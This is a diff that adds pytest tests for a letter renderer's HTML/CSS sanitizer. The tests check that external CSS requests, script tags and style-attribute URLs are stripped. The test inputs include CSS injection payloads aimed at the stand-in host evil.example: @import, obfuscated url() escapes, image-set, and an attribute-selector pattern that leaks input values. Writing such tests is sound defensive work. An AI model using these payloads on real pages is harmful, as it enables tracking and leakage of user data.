@@ -154,3 +154,57 @@ def test_build_sections_sort_ties_break_by_name():
     cases = [_case('a', 'Zed', tpl='1', rank='1'), _case('b', 'Amy', tpl='1', rank='1')]
     sections, _ = build_sections(cases, {'1': '{{ case_name }}'}, 'tpl', sort_by='rank')
     assert sections[0].letters == ['Amy', 'Zed']
+
+
+@pytest.mark.parametrize('css', [
+    '@import "http://evil.example/x.css"; p {color: red}',
+    "@IMPORT url(http://evil.example/x.css);",
+    'p {background: url(http://evil.example/x)}',
+    "p {background: URL( 'http://evil.example/x' )}",
+    "p {background: url('//evil.example/x')}",
+    r'p {background: u\72l(http://evil.example/x)}',
+    r'p {background: \75rl(http://evil.example/x)}',
+    'p {background: image-set("http://evil.example/x" 1x)}',
+    'p {background: -webkit-image-set("http://evil.example/x" 1x)}',
+    'input[value^=a] {background: url(//evil.example/a)}',
+])
+def test_render_neutralizes_external_css_requests(css):
+    out = render_letter(f'<style>{css}</style><p>hi</p>', {})
+    assert '<style>' in out
+    lowered = out.lower()
+    for token in ('@import', 'url(', 'image-set('):
+        assert token not in lowered
+
+
+def test_render_keeps_data_url_in_css():
+    out = render_letter('<style>p {background: url(data:image/png;base64,AAAA)}</style>', {})
+    assert 'url(data:image/png;base64,AAAA)' in out
+    out = render_letter('<style>p {background: url("data:image/png;base64,AAAA")}</style>', {})
+    assert 'url(&quot;data:image' in out or 'url("data:image/png;base64,AAAA")' in out
+
+
+def test_render_strips_script_text():
+    out = render_letter('<script>alert(1)</script><p>hi</p>', {})
+    assert 'alert' not in out
+    assert 'hi' in out
+
+
+def test_render_strips_script_text_case_insensitive():
+    out = render_letter('<SCRIPT type="x">alert(1)</ScRiPt ><p>hi</p>', {})
+    assert 'alert' not in out
+    assert 'hi' in out
+
+
+@pytest.mark.parametrize('style', [
+    'cursor: url(http://evil.example/x), auto',
+    'cursor: u&#114;l(http://evil.example/x), auto',
+    r'cursor: \75rl(http://evil.example/x), auto',
+])
+def test_render_drops_style_attribute_with_external_url(style):
+    out = render_letter(f'<p style="{style}">x</p>', {})
+    assert 'evil' not in out
+    assert '>x</p>' in out
+
+
+def test_render_keeps_plain_style_attribute():
+    assert 'color: red' in render_letter('<p style="color: red">x</p>', {})
